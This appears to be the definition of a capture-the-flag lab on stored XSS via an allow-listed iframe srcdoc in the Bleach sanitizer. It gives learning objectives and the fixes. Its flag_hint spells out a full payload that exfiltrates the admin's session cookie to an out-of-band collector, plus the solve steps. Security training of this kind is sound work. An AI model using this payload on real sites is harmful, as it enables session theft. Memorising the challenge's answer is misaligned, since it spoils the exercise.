title: Stored XSS via iframe srcdoc (Bleach allowlist misconfig)
learning_objectives: Recognise that an HTML sanitizer allowlist vets tag/attribute names, not attribute value semantics — allow-listing <iframe srcdoc> re-opens stored XSS
Understand the about:srcdoc browsing context: a srcdoc document inherits the parent origin, so script inside it runs with the parent's cookies
Craft a stored-XSS payload that survives Bleach 6 sanitization and fires when a higher-privileged victim renders the feed
Exfiltrate a non-HttpOnly admin session cookie to an out-of-band collector across an egress-dropped network
Identify the correct fixes: drop iframe/srcdoc from the allowlist, and mark the session cookie HttpOnly
flag_hint: POST /posts {"body":"<iframe srcdoc=\"<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>\"></iframe>"}; the admin bot renders it on GET /admin/feed and the srcdoc script runs in about:srcdoc (parent origin), exfiltrating its non-HttpOnly session cookie. Read it via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
inspired_by: The iframe srcdoc sanitizer-bypass class (allow-listing <iframe srcdoc> in an HTML sanitizer), abstracted for local Docker with a Playwright victim bot and an OOB collector
